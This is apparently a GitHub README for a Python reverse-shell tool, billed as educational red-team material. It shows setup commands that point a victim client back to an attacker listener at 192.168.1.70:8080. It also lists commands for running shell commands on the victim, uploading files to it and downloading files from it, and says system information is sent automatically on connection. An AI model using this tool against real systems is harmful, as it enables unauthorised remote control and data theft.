# 📌 Remote Command Execution (Educational Only)

![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Windows](https://img.shields.io/badge/OS-Windows-blue)
![Linux](https://img.shields.io/badge/OS-Linux-orange)
![Red Team](https://img.shields.io/badge/Category-Red%20Team-red)
![Status](https://img.shields.io/badge/Status-Educational-orange)
![License](https://img.shields.io/badge/License-MIT-green)

> ⚠️ **Educational Purposes Only**  
> This project demonstrates a simple reverse shell (client → listener) for learning how remote command execution works.  
> **Do NOT use this on systems you do not own or have permission to test.**  
> Use it only in controlled lab environments.

---

## 🚀 Features

- Connects a victim machine (client) to a listener (attacker)
- Supports Windows / Linux / macOS
- Executes remote commands
- Upload & download files using Base64 encoding
- Automatically sends system information on connection

---

## 🧱 Project Structure

```
/project
  ├── client.py
  └── listener.py
```

---

## 🧠 How It Works

### 🔹 Client (victim)

- Connects to a remote server (`server_ip` + `server_port`)
- Waits for commands
- Executes commands locally
- Sends back the result

### 🔹 Listener (attacker)

- Waits for incoming connection
- Sends commands
- Receives output
- Can upload / download files

---

## 🧩 Requirements

### Python Version

- Python 3.8+  

### Libraries

- `socket`
- `subprocess`
- `platform`
- `os`
- `sys`
- `time`
- `optparse`
- `json`
- `base64`

> No external packages needed.

---

## ⚙️ Setup & Usage

---

### ✅ Step 1: Start the Listener (Attacker)

```bash
python3 listener.py -l 192.168.1.70 -p 8080
```

---

### ✅ Step 2: Run the Client (Victim)

Edit `server_ip` and `server_port` in `client.py`

```python
server_ip = '192.168.1.70'
server_port = 8080
```

Then run:

```bash
python3 client.py
```

---

## 🧑‍💻 Commands

| Command | Description |
|--------|-------------|
| `exit` | Close connection |
| `cd <path>` | Change directory |
| `download <file>` | Download file from victim |
| `upload <file>` | Upload file to victim |
| any other command | Executes on victim |

---

## 📌 Example

### Download file from victim:

```
>> download /path/to/file.txt
```

### Upload file to victim:

```
>> upload localfile.txt
```

---

## 🛡️ Security Warning

This tool can be used for **malicious purposes** if used illegally.

**Use only in your own lab or with written permission.**

---

## 📝 License

```
MIT License

Copyright (c) 2025 [YourName]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction...
```

---

## 📫 Contact

If you have questions or feedback, contact me at: **Z3R0D4Y@TUTAMAIL.COM**

<p>  
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=800&size=40&duration=2500&pause=800&color=FF0000&center=true&vCenter=true&width=650&lines=%E2%98%A0%EF%B8%8F+Z3R0D4Y+TEAM" />  
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=800&size=40&duration=2500&pause=800&color=FFFFFF&center=true&vCenter=true&width=650&lines=Learn.+Break.+Defend." />  
</p>  

